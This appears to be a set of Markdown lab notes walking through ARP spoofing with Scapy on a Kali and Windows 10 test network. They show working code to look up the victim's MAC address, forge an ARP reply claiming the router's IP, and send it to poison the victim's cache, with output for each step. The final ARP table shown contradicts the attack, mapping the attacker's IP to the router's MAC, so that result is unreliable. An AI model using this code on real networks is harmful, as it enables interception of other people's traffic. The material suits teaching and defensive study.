# ARP SPOOFING

- ## some variables

```
BROADCAST_MAC: ff:ff:ff:ff:ff:ff

KALI_IP      : KALI_IP
KALI_MAC     : ka:li:ma:c0:ad:dr

W10_IP       : W10_IP
W10_MAC      : w1:00:ma:c0:ad:dr

ROUTER_IP    : ROUTER_IP
ROUTER_MAC   : ro:ut:er:0m:ac:00
```

- create Ether layer
    ```
    broadcast = Ether(dst=BROADCAST_MAC)
    ```
  
    ```
    broadcast.show()
    ```
    output:
    ```
    ###[ Ethernet ]###
        dst= BROADCAST_MAC
        src= KALI_MAC
        type= 0x9000
    ```

- create ARP layer
    ```
    arp_layer = ARP(pdst=W10_IP)
    ```
    ```
    arp_layer.show()
    ```
    output:
    ```
    ###[ ARP ]###
        hwtype= 0x1
        ptype= IPv4
        hwlen= None
        plen= None
        op= who-has
        hwsrc= KALI_MAC
        psrc= KALI_IP
        hwdst= 00:00:00:00:00:00
        pdst= W10_IP
    ```

- create ARP packet
    ```
    arp_packet = broadcast/arp_layer
    ```
    ```
    arp_packet.show()
    ```
    output:
    ```
    ###[ Ethernet ]###
          dst= BROADCAST_MAC
          src= KALI_MAC
          type= ARP
    ###[ ARP ]###
         hwtype= 0x1
         ptype= IPv4
         hwlen= None
         plen= None
         op= who-has
         hwsrc= KALI_MAC
         psrc= KALI_IP
         hwdst= 00:00:00:00:00:00
         pdst= W10_IP
    ```

- send ARP request ang get answered and unanswered lists
    ```
    answer, unanswer = srp(arp_packet, timeout=2, verbose=True)
    ```
    output:
    ```
    Begin emission:
    Finished sending 1 packets.
    
    Received 1 packets, got 1 answers, remaining 0 packets
    ```
    ```
    answer
    ```
    output:
    ```
    <Results: TCP:0 UDP:0 ICMP:0 Other:1>
    ```
    ```
    answer[0]
    ```
    output:
    ```
    (<Ether  dst=BROADCAST_MAC type=ARP |<ARP  pdst=W10_IP |>>,
     <Ether  dst=KALI_MAC src=W10_MAC type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=W10_MAC psrc=W10_IP hwdst=KALI_MAC pdst=KALI_IP |<Padding  load='\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa' |>>>)
    ```
  
- get sent and received layers fromn answer
    ```
    sent, received = answer[0]
    ```
    ```
    sent
    ```
    output:
    ```
    <Ether  dst=BROADCAST_MAC type=ARP |<ARP  pdst=W10_IP |>>
    ```
    ```
    received
    ```
    output:
    ```
    <Ether  dst=KALI_MAC src=W10_MAC type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=W10_MAC psrc=W10_IP hwdst=KALI_MAC pdst=KALI_IP |<Padding  load='\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa' |>>>
    ```
    ```
    sent.show()
    ```
    output:
    ```
    ###[ Ethernet ]###
        dst= BROADCAST_MAC
        src= KALI_MAC
        type= ARP
    ###[ ARP ]###
         hwtype= 0x1
         ptype= IPv4
         hwlen= None
         plen= None
         op= who-has
         hwsrc= KALI_MAC
         psrc= KALI_IP
         hwdst= 00:00:00:00:00:00
         pdst= W10_IP
    ```
    ```
    received.show()
    ```
    output:
    ```
    ###[ Ethernet ]###
        dst= KALI_MAC
        src= W10_MAC
        type= ARP
    ###[ ARP ]###
         hwtype= 0x1
         ptype= IPv4
         hwlen= 6
         plen= 4
         op= is-at
         hwsrc= W10_MAC  <---
         psrc= W10_IP
         hwdst= KALI_MAC
         pdst= KALI_IP
    ###[ Padding ]###
        load= '\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa'
    ```

- get target mac address
    ```
    target_mac = received.hwsrc # W10_MAC
    ```

- create spoofing packet
    ```
    spoof_packet = ARP(op=2, hwdst=W10_MAC, pdst=W10_IP, psrc=ROUTER_IP)
    ```
    ```
    spoof_packet
    ```
    output:
    ```
    <ARP  op=is-at psrc=ROUTER_IP hwdst=W10_MAC pdst=W10_IP |>
    ```
    ```
    spoof_packet.show()
    ```
    output:
    ```
    ###[ ARP ]###
        hwtype= 0x1
        ptype= IPv4
        hwlen= None
        plen= None
        op= is-at
        hwsrc= KALI_MAC
        psrc= ROUTER_IP
        hwdst= W10_MAC
        pdst= W10_IP
    ```

- check arp
    ```
    C:\>arp -a | findstr "KALI_IP ROUTER_IP"
      KALI_IP           KALI_MAC       dynamic
      ROUTER_IP         ROUTER_MAC     dynamic
    ```

- send spoof packet
    ```
    send(spoof_packet, verbose=False)
    ```
- check again arp 
    ```
    C:\>arp -a | findstr "KALI_IP ROUTER_IP"
      KALI_IP           ROUTER_MAC       dynamic
      ROUTER_IP         ROUTER_MAC     dynamic
    ```
